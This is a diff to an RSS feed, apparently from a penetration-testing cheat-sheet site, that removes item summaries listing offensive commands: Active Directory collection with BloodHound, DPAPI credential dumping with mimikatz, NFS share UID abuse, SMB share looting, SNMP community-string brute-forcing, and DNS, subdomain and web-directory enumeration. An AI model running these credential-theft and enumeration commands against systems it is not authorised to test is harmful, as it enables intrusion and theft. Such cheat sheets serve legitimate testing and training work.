@@ -8,95 +8,11 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@enum/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>Bloodhound</title>
-      <link>https://tldrbins.github.io/bloodhound/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/bloodhound/</guid>
-      <description>Info Collection (From Linux) bloodhound-python # With password bloodhound-python -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; -c all --zip # With Kerberos sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; bloodhound-python -u &amp;lt;USER&amp;gt; -k -d &amp;lt;DOMAIN&amp;gt; -dc &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; -c all --zip -no-pass --use-ldaps Note: passing &amp;apos;-no-pass&amp;apos; will still ask for password, press enter&#xA;Info Collection (From Windows) SharpHound.exe SharpHound.ps1 .\SharpHound.exe -c all --outputdirectory C:\ProgramData # Import module . .</description>
-    </item>
-    <item>
-      <title>DNS Enum</title>
-      <link>https://tldrbins.github.io/dns_enum/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/dns_enum/</guid>
-      <description>Zone Transfer dig +noall +answer &amp;lt;DOMAIN&amp;gt; axfr @&amp;lt;TARGET&amp;gt; Domain Discovery dig +noall +answer @&amp;lt;TARGET&amp;gt; &amp;lt;DOMAIN&amp;gt; dig +noall +answer @&amp;lt;TARGET&amp;gt; -x &amp;lt;TARGET&amp;gt; dig +noall +answer @&amp;lt;TARGET&amp;gt; +short &amp;lt;DOMAIN&amp;gt; any dig +noall +answer @&amp;lt;TARGET&amp;gt; -t NS &amp;lt;DOMAIN&amp;gt; </description>
-    </item>
-    <item>
-      <title>DPAPI</title>
-      <link>https://tldrbins.github.io/dpapi/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/dpapi/</guid>
-      <description>Abuse #1: Auto dump (From Linux) Linux DonPAPI collect -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -t &amp;lt;TARGET&amp;gt; Ref: DonPAPI&#xA;Abuse #1: Auto dump (From Windows) mimikatz SharpDPAPI 1. Info Gathering cmd /c &amp;#34;dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Protect &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Protect&amp;#34; 2. Secrets Dump mimikatz.exe &amp;#34;token::elevate&amp;#34; &amp;#34;!+&amp;#34; &amp;#34;!processprotect /process:lsass.exe /remove&amp;#34; &amp;#34;dpapi::cred /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials\&amp;lt;CREDENTIALS_HASH&amp;gt;&amp;#34;&amp;#39; &amp;#39;&amp;#34;dpapi::masterkey /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Protect\&amp;lt;SID&amp;gt;\&amp;lt;PROTECT_HASH&amp;gt; /sid:&amp;lt;SID&amp;gt; /password:&amp;lt;PASSWORD&amp;gt; /protected&amp;#34;&amp;#39; &amp;#39;&amp;#34;dpapi::cred /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials\&amp;lt;CREDENTIALS_HASH&amp;gt;&amp;#34;&amp;#39; &amp;#34;exit&amp;#34; # Run as system .</description>
-    </item>
-    <item>
-      <title>Drupal</title>
-      <link>https://tldrbins.github.io/drupal/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/drupal/</guid>
-      <description>Enum droopescan droopescan scan drupal -u &amp;lt;TARGET&amp;gt; Ref: droopescan Note: This can take a long time to run</description>
-    </item>
-    <item>
-      <title>Find</title>
-      <link>https://tldrbins.github.io/find/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/find/</guid>
-      <description>Linux Locate a file locate &amp;lt;FILE&amp;gt; Find files of type file find . -type f Find and Open find / -name &amp;lt;FILE&amp;gt; -exec cat {} \; Find SUID bit set files find / -type f -user root \( -perm -4000 -o -perm -2000 \) 2&amp;gt;/dev/null -ls Find files owned by user find / -user &amp;lt;USER&amp;gt; -ls 2&amp;gt;/dev/null | grep -v -e &amp;#34; \/proc&amp;#34; -e &amp;#34; \/sys&amp;#34; Find files owned by group find / -group &amp;lt;GROUP&amp;gt; 2&amp;gt;/dev/null | grep -v -e ^/proc Find files created between 1/1/2024 and 31/12/2024 find / -type f -newermt 2024-01-01 !</description>
-    </item>
-    <item>
-      <title>Mount Share</title>
-      <link>https://tldrbins.github.io/share_mount/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/share_mount/</guid>
-      <description> nfs smb List share showmount -e &amp;lt;TARGET&amp;gt; Mount share sudo mount -t nfs &amp;lt;TARGET&amp;gt;:/share /mnt/share/ Unmount share sudo umount /mnt/share/ Mount share sudo mount -t cifs //&amp;lt;TARGET&amp;gt;/share /mnt # Without creds sudo mount -t cifs -o user=,password= //&amp;lt;TARGET&amp;gt;/share /mnt # With creds sudo mount -t cifs -o user=&amp;#39;&amp;lt;USER&amp;gt;&amp;#39;,pass=&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; //&amp;lt;TARGET&amp;gt;/share /mnt Mount inside Windows # Mount net use \\localhost\c$ /u:&amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # Check dir \\localhost\c$\users\administrator\desktop Abuse #1: Misconfigured Share # Check all mounted drives mount # Check how shares are mounted cat /etc/exports +-----------------------------------------------------------------------------------------+ | root_squash : running as root on local system will be treated as nobody user in target | | no_all_squash: every other users permission will translate from local system to target | +-----------------------------------------------------------------------------------------+ # Add dummy user sudo useradd dummy # Change uid sudo usermod -u 1001 dummy # Switch to dummy user sudo su dummy -c bash </description>
-    </item>
-    <item>
-      <title>Nmap</title>
-      <link>https://tldrbins.github.io/nmap/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/nmap/</guid>
-      <description>Nmap Scan TCP UDP Script target=&amp;lt;TARGET&amp;gt; nmap -p- --min-rate 10000 -oA ./nmap-alltcp $target ports=$(cat nmap-alltcp.nmap| grep -Eo &amp;#34;^[0-9]+&amp;#34; | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed -r &amp;#39;s/,$//&amp;#39;) nmap -p $ports -sCV -oA ./nmap-tcpscripts $target target=&amp;lt;TARGET&amp;gt; nmap -sU --min-rate 10000 -oA ./nmap-udp $target ports=$(cat nmap-udp.nmap| grep -Eo &amp;#34;^[0-9]+&amp;#34; | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed -r &amp;#39;s/,$//&amp;#39;) nmap -p $ports -sU -sCV -oA ./nmap-udpscripts $target Update scripts DB nmap --script-updatedb Search scripts # e.</description>
-    </item>
-    <item>
       <title>Scheduled tasks</title>
       <link>https://tldrbins.github.io/scheduled_tasks_windows/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/scheduled_tasks_windows/</guid>
       <description>Check scheduled tasks Windows schtasks /query # List details schtasks /TN \Microsoft\Windows\&amp;lt;FOLDER&amp;gt;\&amp;lt;TASKNAME&amp;gt; /FO LIST /V </description>
-    </item>
-    <item>
-      <title>SMB Enum</title>
-      <link>https://tldrbins.github.io/smb_enum/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/smb_enum/</guid>
-      <description>SMB Share Enum nmap sudo nmap --script=smb-enum-shares -p 445 &amp;lt;TARGET&amp;gt; Anonymous Login smbmap smbclient impacket smbmap -H &amp;lt;TARGET&amp;gt; --no-banner smbmap -H &amp;lt;TARGET&amp;gt; -u null --no-banner # List known share smbmap -H &amp;lt;TARGET&amp;gt; -r &amp;lt;SHARE&amp;gt; smbclient -N -L \\\\&amp;lt;TARGET&amp;gt;\\ # After found an accessible share smbclient -N \\\\&amp;lt;TARGET&amp;gt;\\&amp;lt;SHARE&amp;gt;\\ # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\&amp;lt;TARGET&amp;gt;\\ --option=&amp;#39;client min protocol=NT1&amp;#39; # SID brute, if null auth allowed impacket-lookupsid test@&amp;lt;DOMAIN&amp;gt; -no-pass Authenticated smbmap smbclient smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # List known share smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -R &amp;lt;SHARE&amp;gt; # Download file smbmap -H &amp;lt;TARGET&amp;gt; -r &amp;lt;SHARE&amp;gt; --download &amp;lt;PATH_TO_FILE&amp;gt; # List files with regex pattern smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -r &amp;lt;SHARE&amp;gt; -A &amp;lt;FILE_PATTERN&amp;gt; smbclient -L \\\\&amp;lt;TARGET&amp;gt;\\ -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; # After found an accessible share smbclient \\\\&amp;lt;TARGET&amp;gt;\\&amp;lt;SHARE&amp;gt;\\ -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; Authenticated with Kerberos impacket impacket-smbclient &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; -k -no-pass Basic commands # List all files in a share recurse ON ls # Download all files mask &amp;#34;&amp;#34; recurse ON prompt OFF mget * List Alternate Data Streams (ADS) allinfo &amp;lt;FILE&amp;gt; # Example Response &amp;gt;&amp;gt;&amp;gt;stream: [:Password:$DATA], 15 bytes # Download specific data stream get &amp;#34;&amp;lt;FILE&amp;gt;:Password&amp;#34; Mount SMB Share Anonymous Authenticated sudo mount -t cifs //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt sudo mount -t cifs -o ro,user=&amp;lt;USER&amp;gt;,password=&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt Check write permission sudo find .</description>
-    </item>
-    <item>
-      <title>SMTP</title>
-      <link>https://tldrbins.github.io/smtp/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/smtp/</guid>
-      <description>Simple Mail Debugging Server #!/usr/bin/env python3 import aiosmtpd.controller class CustomSMTPHandler: async def handle_DATA(self, server, session, envelope): print(f&amp;#34;[+] Received a mail.&amp;#34;) print(&amp;#34;=&amp;#34; * 50) print(envelope.content.decode()) print(&amp;#34;=&amp;#34; * 50) return &amp;#34;250 OK&amp;#34; handler = CustomSMTPHandler() server = aiosmtpd.controller.Controller(handler, hostname=&amp;#34;0.0.0.0&amp;#34;, port=25) server.start() print(&amp;#34;[*] Listening on 0.0.0.0:25&amp;#34;) input(&amp;#34;[*] Server started. Press Return to quit.\n&amp;#34;) server.stop() Users Enum nmap script smtp-user-enum nmap -p 25 --script=smtp-enum-users &amp;lt;TARGET&amp;gt; # Use RCPT smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t &amp;lt;TARGET&amp;gt; # Use VRFY smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/cirt-default-usernames.</description>
-    </item>
-    <item>
-      <title>SNMP</title>
-      <link>https://tldrbins.github.io/snmp/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/snmp/</guid>
-      <description>Bruteforce commmuity string onesixtyone snmpbrute # Brute force community string for snmpwalk use onesixtyone &amp;lt;TARGET&amp;gt; -c /usr/share/doc/onesixtyone/dict.txt Ref: onesixtyone&#xA;# Brute force community string (Check also SNMPv2) python3 snmpbrute.py -t &amp;lt;TARGET&amp;gt; Ref: snmpbrute.py&#xA;Tools snmpwalk snmpbulkwalk # Install sudo apt install snmp # Install Add-on for better result readability sudo apt install snmp-mibs-downloader # Comment out this line in /etc/snmp/snmp.conf # mibs : # Uncomment this line in /etc/snmp/snmp.conf mibdirs /usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf Basic Commands snmpwalk -v1 -c public &amp;lt;TARGET&amp;gt; | tee snmpwalk_result snmpwalk -v2c -c public &amp;lt;TARGET&amp;gt; | tee snmpwalk_result # Query specific OID, e.</description>
-    </item>
-    <item>
-      <title>Subdomain Enum</title>
-      <link>https://tldrbins.github.io/subdomain_enum/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/subdomain_enum/</guid>
-      <description>Add domain/subdomain to /etc/hosts echo &amp;#34;&amp;lt;TARGET&amp;gt; &amp;lt;DOMAIN&amp;gt;&amp;#34; | sudo tee -a /etc/hosts wfuzz gobuster wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.&amp;lt;DOMAIN&amp;gt;&amp;#34; -u http://&amp;lt;DOMAIN&amp;gt; Take note of the word size, Ctrl+C to interrupt the process, then run again wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.&amp;lt;DOMAIN&amp;gt;&amp;#34; -u http://&amp;lt;DOMAIN&amp;gt; --hw 10 Filter out response with header # For example: Access-Control-Allow-Origin wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Origin: http://FUZZ.&amp;lt;DOMAIN&amp;gt;&amp;#34; --filter &amp;#34;r.headers.response ~ &amp;#39;Access-Control-Allow-Origin&amp;#39;&amp;#34; -u http://&amp;lt;DOMAIN&amp;gt; gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.</description>
-    </item>
-    <item>
-      <title>Web Directory Enum</title>
-      <link>https://tldrbins.github.io/web_directory_enum/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/web_directory_enum/</guid>
-      <description>feroxbuster wfuzz gobuster bfac ds_walk HTTP feroxbuster -u http://&amp;lt;TARGET&amp;gt;/ --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --dont-extract-links HTTPS feroxbuster -u https://&amp;lt;TARGET&amp;gt;/ -k --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --dont-extract-links Specify Extension feroxbuster -u http://&amp;lt;TARGET&amp;gt;/ --methods=GET,POST --depth=1 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x html, asp, aspx Add trailing slash &amp;apos;/&amp;apos; to each request feroxbuster -u http://&amp;lt;TARGET&amp;gt;/ -f --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt API Fuzzing feroxbuster -u http://&amp;lt;TARGET&amp;gt;/ --force-recursion -C 404,405 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt Fuzzing Number Range wfuzz -z range,1-99 http://&amp;lt;TARGET&amp;gt;/users/FUZZ gobuster dir -u http://&amp;lt;TARGET&amp;gt; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.</description>
     </item>
   </channel>
 </rss>
